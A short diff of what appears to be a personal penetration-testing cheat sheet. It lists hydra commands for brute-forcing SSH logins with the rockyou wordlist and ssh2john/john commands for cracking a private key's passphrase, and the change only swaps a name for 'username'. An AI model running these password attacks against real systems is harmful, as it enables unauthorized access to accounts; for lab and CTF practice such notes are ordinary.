@@ -5,8 +5,8 @@ hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
 hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
 
 ssh hash and crack
-/usr/share/john/ssh2john.py kay_id_rsa > forkay.txt
-john forkay.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+/usr/share/john/ssh2john.py username_id_rsa > forusername.txt
+john forusername.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 
 
 
